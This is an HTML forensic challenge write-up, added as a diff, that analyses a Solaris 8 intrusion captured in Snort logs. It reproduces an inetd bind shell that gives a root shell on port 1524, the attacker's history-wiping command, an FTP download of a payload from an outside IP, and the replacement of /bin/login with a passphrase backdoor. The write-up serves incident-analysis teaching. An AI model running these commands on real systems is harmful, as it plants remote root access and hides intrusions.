@@ -1,0 +1,176 @@
+<!DOCTYPE doctype PUBLIC "-//w3c//dtd html 4.0 transitional//en"><html><head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Author" content="Abraham">
+   <meta name="GEN" content="w0rd [en] (SunOS; U) []">
+   <meta name="GENERATOR" content="x00 [] (SunOS; U) [NOP]">
+   <title>Scan 20 Solaris Attack</title></head>
+
+<body>
+
+<center><b><font size="+2">Scan 20</font></b>
+<br><b><font size="+2">Decode a Sparc Solaris 8 attack and Investigate the
+Solaris box</font></b>
+<br><b><font size="+1">Skill Level: Intermediate</font></b>
+<p><b>Analysis by: <i>Abraham Lincoln Hao</i></b>
+<br><b>E-mail:</b>
+<br><b><a href="mailto:Abraham@nssolution.com">Abraham@Nssolution.Com</a>
+/ <a href="mailto:SunNinja@Scientist.com">SunNinja@Scientist.com</a></b></p></center>
+<b><font size="+1">Introduction:</font></b>
+<p>    Analysis was performed on SunOS, Linux and Windows
+Operating system.
+</p><p><b><font size="+1"> 1] Check md5Checksum 0108@000-snort.log.tar.gz 
+and extracting the file.</font></b>
+<br>[root@nssilabs forensic]# md5sum 0108@000-snort.log.tar.gz
+<br>612be364f54ca5fcb47cf70e69419175  0108%40000-snort.log.tar.gz
+</p><p>[root@nssilabs forensic]# tar -xzvf  0108@000-snort.log.tar.gz
+<br>0108@000-snort.log
+</p><p><b><font size="+1">2] Decoded information from binary logs</font></b>
+<br><a href="http://project.honeynet.org/scans/scan20/sol/1/tcpdump0108.log">Packet dump of 0108@000-snort.log binary</a>
+<br><a href="http://project.honeynet.org/scans/scan20/sol/1/strings0108.log">Strings of  0108@000-snort.log binary</a>
+</p><p><b><font size="+1">3] Tools &amp; References used</font></b>
+<br><a href="http://project.honeynet.org/scans/scan10">http://project.honeynet.org/scans/scan10</a>
+<br><a href="http://www.tcpdump.org/">http://www.tcpdump.org</a>
+<br><u><font color="#3333ff">Shell utils</font></u>
+<br><a href="http://www.ethereal.com/">http://www.ethereal.com</a>
+<br><a href="http://www.cert.org/">http://www.cert.org</a>
+<br> 
+</p><p><b><font size="+2">Question and Answers</font></b>
+</p><p><b>1. What is a NOP slide, and how is this one different from the NOP
+slide in the rpc.statd exploit in Scan10?</b>
+</p><p><b><i>Answer:</i></b>
+<br>    What is a NOP slide?:
+<br>     Nop slide appears to describe the practice
+of using nops to slide the ep into the shell code, when doing a bufferoverflow
+attack.
+</p><p>    How is this different from the NOP slide in the rpc.statd
+exploit in Scan10?
+<br>    The concept could be the same, But the nops have
+a diffrent byte strings.
+<br> 
+</p><p><b>2. The attack was on 08 Jan, 2002. Would Snort have generated an
+alert then for the attack?</b>
+</p><p><i>  <b>  Answer:</b></i>
+<br><b>        </b>Yes. because based
+on IDS logs. snort successfully capture how the attacker exploited Sparc
+Solaris box and what daemon the attacker exploited.
+<br> 
+</p><p><b>3. In the exploit code, the command "/bin/sh sh -i" is given, what
+is its purpose, and why is 'sh' shown twice?</b>
+</p><p><b><i>Answer:</i></b>
+<br><b>   The command "/bin/sh sh -i" is given, what is its purpose.:</b>
+<br>    The purpose of  that command is to make the
+shell interactive. you may try it  using the example below:
+<br>    # echo "ingreslock stream tcp nowait root /bin/sh
+sh -i"&gt; /tmp/x
+<br>    # /usr/sbin/inetd -s /tmp/x
+<br>    # telnet localhost 1524
+<br>      Trying 127.0.0.1...
+<br>      Connected to localhost.
+<br>      Escape character is '^]'.
+<br>   #
+</p><p>    <b> Why is 'sh' shown twice?</b>
+<br>      It is shown twice to have a interactive
+shell mode everytime the attacker connects to the port. Because if you
+only specify single "sh" (/bin/sh -i) if the attacker
+<br>      connects to the port remotely and spawns
+a shell he needs to include ";" everytime he enters a command example below:
+<br>       Using Single "sh" (/bin/sh -i)
+command
+<br>        # echo "ingreslock stream
+tcp nowait root /bin/sh  -i"&gt; /tmp/x
+<br>       # /usr/sbin/inetd -s /tmp/x
+<br>       # telnet localhost 1524
+<br>        Trying 127.0.0.1...
+<br>        Connected to localhost.
+<br>        Escape character is '^]'.
+<br>        cd /usr/local<b>;</b>
+<br>        -i: ^M: not found
+<br>         pwd<b>;</b>
+<br>        /usr/local
+<br>        -i: ^M: not found
+</p><p>        - As you would notice everytime
+we issue a command it needs ";" semi-colon. While if we use double sh (/bin/sh
+sh -i) if the attacker connect to ingreslock port
+<br>          it will spawn
+a interactive shell example below:
+<br>          # telnet localhost
+1524
+<br>          Trying 127.0.0.1...
+
+<br>         Connected to localhost.
+<br>         Escape character is
+'^]'.
+<br>         # cd /usr/local
+<br>         # pwd
+<br>         /usr/local
+<br> 
+</p><p><b>4. The attacker executed a variety of commands on the hacked Solaris
+box. Which commands were automated by the exploit, which commands were
+manual by the attacker himself?</b>
+</p><p><b><i>Answer:</i></b>
+<br>    <b>Automated commands by the exploit:</b>
+<br>    # uname -a
+<br>    # ls -l /core /var/dt/tmp/DTSPCD.log
+<br>    # PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin
+<br>    # export PATH;
+<br>    # echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep
+-v grep|awk '{print $2}'`
+</p><p>   <b> Manually executed commands by the attacker:</b>
+<br>    # w
+<br>    # unset HISTFILE
+<br>    # cd /tmp
+<br>    # mv /bin/login /usr/lib/libfl.k
+<br>    # ftp 64.224.118.115
+<br>        cd pub
+<br>        binary
+<br>        get sun1
+<br>        bye
+<br>   # ls
+<br>   # chmod 555 sun1
+<br>   # mv sun1 /bin/login
+</p><p><b>5. What is sun1, and how does it work?</b>
+</p><p><b><i>Answer:</i></b>
+<br>    sun1 is a  login backdoor. The attacker can
+login to the box without being logged and He only needs to enter a secret
+Passphrase to login as root.
+<br>:Example
+<br>[root@nssilabs /root]# telnet  192.168.x.x
+<br>Trying 192.168.x.x...
+<br>Connected to 192.168.x.x.
+<br>Escape character is '^]'.
+<br>0wned?^M
+</p><p>       g0t r00t?
+<br>sh-2.03#
+</p><p>- IP 192.168.x.x /bin/login is modified with a backdoored login. where
+"0wned" is the secret passphrase after entering the password it prompts
+for a root shell :)
+</p><p><b>6. What did you learn from this exercise?</b>
+</p><p><b><i>Answer:</i></b>
+<br>    I've learned how the attacker penetrated the Solaris
+Sparc b0x and What technique the attacker used.
+<br> 
+</p><p><b>7. How long did this challenge take you?</b>
+</p><p><b><i>Answer:</i></b>
+<br>    3 1/2 Hours.
+</p><p><b>Bonus Question:</b>
+<br>One of the commands executed during the attack is
+<br>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
+$2}'`
+</p><p>What is the purpose of this command and what does 'BD' stand for
+</p><p><b><i>Answers:</i></b>
+<br>    -
+<br>BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}"
+This command will show BD PID(s): &lt;PID Number&gt;
+<br><b>Example:</b> <i>BD PID(s): 970</i>
+<br> 
+</p><p>What "BD" stands for
+<br>    - BackDoor :)
+<br> 
+</p><p>-------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+<br>Greetings:
+<br>    Mr. Tim Lawless a.k.a Lawless :), NSSI members,
+jet- A.K.A jethro (ebat.org :)
+</p><p>URL:
+<br>    <a href="http://www.nssolution.com/">http://www.nssolution.com</a>
+<br> 
+</p></body></html>
